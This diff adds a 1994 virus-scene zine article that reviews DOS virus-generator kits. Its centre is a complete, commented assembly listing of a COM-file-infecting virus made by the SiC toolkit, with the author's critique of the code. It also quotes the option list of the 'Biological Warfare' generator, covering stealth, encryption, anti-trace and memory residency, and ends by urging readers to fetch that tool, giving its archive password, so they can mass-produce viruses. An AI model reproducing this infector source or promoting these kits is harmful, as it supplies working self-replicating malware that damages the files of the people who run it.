@@ -1,0 +1,377 @@
+  		     More virus-generators
+  		     =====================
+  
+  I first want to do something that I'm not allowed to do. Eh? What?
+  Well. I quote F-bull 2.07 which was released in February 1993 and
+  in where they tried to foretell the future, i.e. what would happen
+  in 93/94. 
+  
+  Quoting F-bull
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  o   More and more viruses have been appearing in shorter and shorter
+      periods. We believe the growth rate will start to turn down.
+      More viruses will still be developed in even shorter periods of
+      time, but the growth rate will not increase as fast as before.
+  o   There will be more polymorphic viruses.
+  o   The amount of viruses that attack specific anti-virus 
+      programs will increase.
+  o   Toolkit programs for making viruses will grow more common
+  o   Viruses for the Windows and OS/2 environments will 
+      become more common.
+  o   The first cross-platform viruses will appear.
+   
+  Bravo - F-bull
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  Well, since the release of F-bull 2.07 we've seen many new viruses
+  being developed, hacked, mutated or mass-produced-code-generated
+  (Bravo).
+  
+  Then, the scene has received quite a few new polymorfic viruses, 
+  engines, and anti-anti-virus so I guess he's right here as well. 
+  But, that's not what I was going to write about. Nah. What's 
+  interesting here is his guess concerning the "mass-producers". Well,
+  since VCL, PS-MPC and G2 already are "legendary", he naturally 
+  thought that more people would start to produce such toolkits! Right?
+  
+  What happened..
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  Oh well, but what happend? Silence.. Not too much!! Actually, since
+  the release of G2 there was a long silence concerning those "toys".
+  Why? I don't really know, maybe people realized that they couldn't
+  write a better tool than G2 or something? (Just my wildest guess!)
+  
+  Anyhow, after about one year and three month later a new toolkit
+  was released. This time, by a complete new group. Well, actually
+  I don't know if they group itself was new, but what I do know is that
+  they're new into viruses. Of'cos talking about Simply Insane Coderz,
+  or SiC as they call themself.
+  
+  Sic virus creation laboratory
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  Well this generator called SiC ViRUS CREATION LAB is somehow reminding 
+  of VCS. Though, the main difference is that this toy was written in
+  1994 instead of 1989. The features are pretty much the same.
+  
+  SiCVCL? :) can only produce non-encrypted run-time virus that infects
+  all COM files in the current directory in one singel run. The viruses
+  created with the "creator" doesn't vary for shits. Oh, (of'cos) except 
+  for the text string you're allowed to include in the virus :-). ..and
+  if that shouldn't be enough, the generator produces dysfunctionabel
+  as well as scannable code! Gawn.
+  
+  Yah. How impressing, not! Well, but to back up my claims I started
+  to dissassemble the code. ...and well, this is a byte-to-byte match-up
+  dissassembly of the virus, so you can check the code up for yourself.
+--------------------------------------------------------------------------------
+  dta_offset equ 80h
+  
+  .model tiny
+  .code
+  org    100h
+  
+  ; Dissassembly of the "Hello_World.348" virus created in SiCVCL.
+  ; By The Unforgiven & Raver of Immortal Riot for Insane Reality #5.
+  
+  Start:
+  jmp_startie      db 0e9h,00h,00h        ; jump start1
+  
+  start1:
+  		call	Sic_Virus
+  
+  Sic_Virus:
+  	nop			       ; F##K
+  	nop			       ; #UC#
+  	pop	bp		       ; S##H
+  	nop			       ; #HI#
+  	sub	bp,offset Sic_Virus    ; F##K
+  	nop			       ; #UC#
+  	nop			       ; S##H
+  	nop			       ; #IT#
+  	nop			       ; !!!!
+  ;       ^^ Here we'll get the delta_offset with somehow strange
+  ;          code (all NOPs); which will result in TbScan detects
+  ;          it as the IVP {2} virus!
+  
+  	lea	si,[bp+retbuf]	       ; Restore start of COM
+  	mov	di,100h		       ; file to 100h
+  	push	di		       ; Store it
+  	movsb			       ; 
+  	movsw			       ; 
+  	lea	dx,[bp+dta_area]       ; Set new DTA-area.
+  
+  	call	set_dta		       ; Set dta, so the org-program
+  	lea	dx,[bp+com_mask]       ; can execute with parameters!
+  	call	find_first	       ; Search for files!
+  	call	print_                 ; Print!
+  	mov     dx,dta_offset	       ; Restore DTA-area to 80h
+  	call	set_dta		       ; (the default value!)
+  	retn                           ; and return to org-program!
+  
+  ; This virus got some pretty dumb struction (i.e. all fukking calls, 
+  ; instead of writing the procedure's right after each other, saving 
+  ; bytes/time!)
+  
+  Find_first:
+  	mov	ah,4Eh			; Find first file with the
+  	mov	cx,7			; extension of 'COM' and
+  Loop_Files:				; any attribute!
+  	int	21h			;
+  	jc	Error_Search		; If error, quit
+  	call	Find_One 		; No error, prepare to infect!
+  	mov	ah,4Fh			; Find next file, and do
+  	jmp	short Loop_Files	; the normal file-search-loop!
+  
+  Error_Search:
+  	retn
+  
+  Find_One:
+       	mov	ax,3D00h		; Open file in read-mode!
+  	call	Open_File		; Yep, do it!
+  	mov	ah,3Fh			; then, read file
+  	mov	cx,1Ah			; Read 26 bytes (????)
+  	lea	dx,[bp+readbuf]		; Where to read to
+  	int	21h			; 
+  	mov	ah,3Eh			; Close file!
+  	int	21h			; Int 21h!
+  	mov     bx,word ptr cs:[bp+dta_Area+1ah] ; Bx=File-size
+  	mov     cx,word ptr cs:[bp+readbuf+1]	 ; CX=Lenght of
+  						 ; init jmp
+  	add	cx,107h			; Add 107h to CX, and if it's
+  	cmp	bx,cx			; equal to bx, it's already
+  	je	Already_Infected	; infected!
+  	jmp	short Infect    	; Is not equ, then, infect!
+  
+  ;       ^^^ Why not just use a jne infect = saving 2 bytes!
+  
+  Already_Infected:
+  	retn
+  Infect:
+  	sub	bx,3			; BX=Lenght of new init-jmp
+  	lea	si,[bp+readbuf]		; Transfer the original-
+  	lea	di,[bp+retbuf]		; 3 bytes to retbuf
+  	movsw				; 
+  	movsb				; 
+  	mov	byte ptr cs:readbuf[bp],0E9h ; Readbuf=new-jmp
+  	mov	word ptr cs:readbuf[bp+1],bx ;
+  	mov	cx,3		
+  	jmp	short $+2		; Jump next-instruction
+  
+  	push	cx			; 
+  	xor	cx,cx			; Clear file-attribs
+  	call	File_Attribs		; 
+  	mov	al,2			; Open the file
+  	call	Open_File               ; in read/write mode
+  	mov	ah,40h			; and then we'll write
+  	lea	dx,[bp+readbuf]		; our first little jump!
+  	pop	cx			; Restore file-attribs!
+  	int	21h			; ....................
+  
+  ;       ^^ Why not just skip the push/pop cx, and place the
+  ;          mov cx,103h where it belongs!?
+  
+  	jc	Set_Attribs		; Jump if error
+  	mov	al,2                    ; Move the file-pointer
+  	call	F_Ptr_EOF		; to end of file!
+  
+  	mov	ah,40h			; Then, we'll write
+  	mov	cx,104h			; (only) 260 bytes!
+  	lea	dx,[bp+start1]		; ie, start1-DTAarea
+  	int	21h                     ; 
+  
+  ;       ^^ Now, this *IS* REALLY FUCKING STUPID! B'cos we'll
+  ;          not write the "Print_message" so "infected" programs
+  ;          will display garbage text before EACH execution! 
+  
+  Set_Attribs:
+  	mov	ax,5701h  ; Set file-attributes to "original"
+  	mov     cx,word ptr cs:[bp+dta_area+16h] ; cx=time
+  	mov     dx,word ptr cs:[bp+dta_area+18h] ; dx=date
+  	int	21h			; 
+  	mov	ah,3Eh			; Then, we'll close
+  	int	21h                     ; the infected file!
+  	xor	cx,cx			; 
+  	mov     cl,byte ptr cs:[bp+dta_area+15h] ; Cl=File-Attrib
+  	call	File_Attribs		; Set file-attribs
+  	retn
+  
+  F_ptr_EOF:
+  	mov	ah,42h			; Move file-pointer!
+  	xor	cx,cx			; cx=0
+  	xor	dx,dx			; dx=0
+  	int	21h
+  	retn
+  
+  Set_dta:
+  	mov	ah,1Ah			; Set DTA
+  	int	21h
+  	retn
+  
+  Open_File:
+  	mov	ah,3Dh			; Open file 
+  	lea     dx,[bp+dta_area+1eh]	; 
+  	int	21h			;
+  	xchg	ax,bx			; File handle in BX
+  	retn
+  
+  ;       ^^ He opens the file twice, which is pretty a pretty dumb
+  ;          thing to do. Also, he could use ax=3d02h instead of
+  ;          placing different values in AL.
+  
+  File_Attribs:
+  	mov	ax,4301h	       ; Set back attribute
+  	lea dx,[bp+dta_Area+1eh]       ; to the file-name.
+  	int	21h
+  	retn
+  
+  	db	0E8h, 09h, 00h	       
+  
+  ;       ^^ Some pretty strange jump instruction b'cos we NEVER use
+  ;          it.
+
+  print_:
+  	mov	ah,9h		       ; Print the text that
+  	lea	dx,[bp+24bh]	       ; never will be written
+  	int	21h		       ; to the infected files!
+  	retn
+  
+  com_mask db     '*.com',0	       ; Files to search for
+  retbuf 	 db	0CDh, 20h, 00h ; int20h instruction to
+  				       ; the carrier-file
+  dta_area db 42 dup(0)		       ; DTA area
+  readbuf  db 26 dup (0)               ; Buffer to read
+  
+  Comment *
+  
+  DTA-area:
+  
+     Offset     Size     What it is
+     0h        21 BYTES  Reserved, varies as per DOS version
+     15h       BYTE      File attribute
+     16h       WORD      File time
+     18h       WORD      File date
+     1Ah       DWORD     File size
+     1Eh       13 BYTES  ASCIIZ filename + extension *
+  
+  print	db	'Hello, world!', 0Dh, 0Ah ; The classic one
+  	db	 1Ah, 24h		  ; End of text-file-marker!
+  
+  end start
+--------------------------------------------------------------------------------
+  
+  Sic stupid ideas
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ 
+  Well, as you could see, there was no reason to spread out a whole
+  generator for this purpose. Heck, why not instead just release a
+  source code to a virus, let the jerks change the text-string in it,
+  and voila!? This generator includes no more feature than that.
+  
+  But now, let's not discuss this generator any more, instead let's
+  talk about what happened after the release of SiC. Suprise Suprise!
+  Yah. Another generator known as "Biological Warfare" and created by
+  MnemoniX was released!
+  
+  Biological Warfare
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ 
+  This creation was far better than for instance VCS and SiC. Actually
+  it had features that none of VCL, PS-MPC and G2 had, stealth. Well,
+  let me quote the documentation from version .090á.
+--------------------------------------------------------------------------------
+  A) Text - Any text you wish to appear within the virus, up to 
+     60 characters.
+  
+  B) Resident - Specifies whether virus will be resident in memory or 
+                not. "Y" specifies a resident virus.
+  
+  C) Infect - Either COM, EXE, or both. Infects the corresponding files.
+  
+  D) Encryption - "Y" specifies that the virus will feature encryption. 
+                   The program implements a few different encryption 
+                   algorithms in a number of different ways for variety.
+  
+  E) INT 24 Handler - "Y" specifies that the virus will steal DOS's 
+                       critical error handler to avoid write protect 
+                       errors.
+  
+  F) Anti-Trace - "Y" specifies that the virus will includes routines to 
+                   thwart trivial debugging or tracing.
+  
+  G) Maximum Size - Either Y or N. If "Y" is selected, the virus will not 
+                    infect any .COM file too large for it. 
+                    (.COM infectors only)
+  
+  H) Traversal - "N" specifies that the virus will only infect in the 
+                  current directory; "Y" specifies the virus will move 
+                  upwards in the directory tree. 
+                  (Non-resident viruses only)
+  
+  I) Infections/run - Maximum number of files to infect each run. 
+                      Selecting "0" will cause all possible files to 
+                      be infected. (Non-resident viruses only)
+  
+  J) Avoid COMMAND - "Y" specifies that the virus will not infect 
+                      COMMAND.COM. (.COM infectors only)
+  
+  K) EXE Marker - Two characters used to indicate an infected .EXE file. 
+                  (.EXE infectors only)
+  
+  L) Overlay check - "Y" specifies that the virus will not infect .EXE 
+                     files with internal overlays. (.EXE infectors only)
+  
+  M) DirStealth - Hides the file size increases from a directory listing.
+                  All infected files have their seconds field set to the 
+                  given number. Absence of this number indicates that no 
+                  directory stealth function will be included. 
+                  (Resident viruses only)
+  
+  N) Infect on -  Specifies what conditions the virus infects under. 
+                  "EXEC" specifies that the virus will infect on execute;
+                  "OPEN" specifies that it will infect on file opening; 
+                  and if both are given, the viruses infects on execution 
+                  and file opening. (Resident viruses only)
+  
+  O) Activate - If "Y" is chosen, the virus will include space for an 
+                activation routine in the code.
+  
+  P) More dir stealth - A last minute addition. This may be only used 
+                        in conjunction with directory stealth; it will 
+                        make the increase in file size invisible from 
+                        any file managing programs in addition to a 
+                        DIR command. If "Y" is chosen this feature is 
+                        added. (Resident viruses only)
+--------------------------------------------------------------------------------
+  
+  Not for lamers
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  Well, as one can see, this is a great tool, though it'll sometime
+  produce code which cannot be compiled without altering. But heck, 
+  since he later mentioned that the tool wasn't for non-programmers,
+  and other morons it doesn't really matters, b'cos they were all
+  easily fixed. 
+  
+  Complains/Jokes - without any reason
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  Also, he stated in P) (4eh/4fh stealth) that the file size was 
+  invisible from ANY file managing programs. Well, not really, eh?
+  
+  Imagine this program: It opens a file, seek the end of file (ax=4202h)
+  compare it with the value you get displayed from the files when using
+  the functions 11/12/4e/4fh/int21h. ...and if something didn't match,
+  you just convert the value in ax (filesize) into ascii and display it!
+  
+  Hm. I think you also could read direct from the FAT and from there
+  get the size of the file, etc. but oh well, that's of less importance!
+  What's of importance is that this program is just great, and I'm
+  looking forward to see version 1.00 of it, maybe (as he said), carrying
+  these features:
+  
+  Biological Warefare 1.00
+  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+     * Polymorphism (with my own MutaGen encryption engine)
+     * More stealth abilities
+     * Anti-AV techniques
+     * Boot sector infection, if I'm feeling ambitious
+  
+  So now folks, go get a copy of BW90á.??? (Password: Lo Tek) and
+  start cream out all the BW-generated viruses around!
+  
+                        = The Unforgiven =
